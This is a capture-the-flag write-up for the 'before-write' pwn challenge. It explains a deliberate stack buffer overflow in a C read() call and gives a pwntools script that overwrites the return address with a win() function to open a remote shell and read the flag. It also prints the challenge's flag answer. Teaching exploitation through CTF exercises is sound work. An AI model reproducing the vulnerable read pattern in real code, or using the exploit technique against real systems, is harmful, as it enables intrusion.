# before-write : Pwn

Numb'r taken but not writ.

Attachment  
[before-write.tar.gz](before-write.tar.gz)  

Tags : Buffer Overflow, Win Function  
Author : ptr-yudai

# Solution

Check the source code.
```c main.c
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

void win(void) {
  char *args[] = {"/bin/sh", NULL};
  execve(args[0], args, NULL);
}

ssize_t getval(const char *msg) {
  char buf[0x20] = {};
  write(STDOUT_FILENO, msg, strlen(msg));
  read(STDIN_FILENO, buf, sizeof(buf)*0x20);
  return atoll(buf);
}

int main() {
  return getval("value: ");
}
```
This code reveals the existence of win().  
In addition, there is BOF at `read`.  
The input change to long long type integer but this time it does not affected to exploit.
```
$ checksec chall
[*] '/home/colza/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
```
The apploach is as follows:
* Overflow and overwirte the return address to the `win` address.

The return address is located at `rbp+0x8`. And, input is located at `rbp-0x20`. So, offset from input to return address is `0x28`.
```
$ objdump -M intel -d chall
...
  401240:       48 8d 45 e0             lea    rax,[rbp-0x20]
  401244:       ba 00 04 00 00          mov    edx,0x400
  401249:       48 89 c6                mov    rsi,rax
  40124c:       bf 00 00 00 00          mov    edi,0x0
  401251:       e8 4a fe ff ff          call   4010a0 <read@plt>
...
```

The steps are as follows:
 * input the payload that is consist of 0x28-padding and `win` address

Execution code below:
```python solve.py
from pwn import *

elf = ELF("./chall")

p = remote("34.170.146.252", 31391)

win_addr = elf.symbols["win"]
payload = b"a" * 0x28 + p64(win_addr)

p.sendlineafter(b"value: ", payload)

p.interactive()
```
Execute it.
```
$ python3 solve.py
[*] '/home/colza/chall'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    SHSTK:      Enabled
    IBT:        Enabled
    Stripped:   No
[+] Opening connection to 34.170.146.252 on port 31391: Done
[*] Switching to interactive mode
$ ls
bin
boot
dev
etc
flag-97216f59ce413e829cb3418becff32d0.txt
home
lib
lib32
lib64
libx32
media
mnt
opt
proc
root
run
sbin
srv
sys
tmp
usr
var
$ cat flag*
RTACTF{sizeof_is_a_bit_c0nfus1ng}
$ exit
[*] Got EOF while reading in interactive
$
$
[*] Closed connection to 34.170.146.252 port 31391
[*] Got EOF while sending in interactive
```

Get the flag!

`RTACTF{sizeof_is_a_bit_c0nfus1ng}`
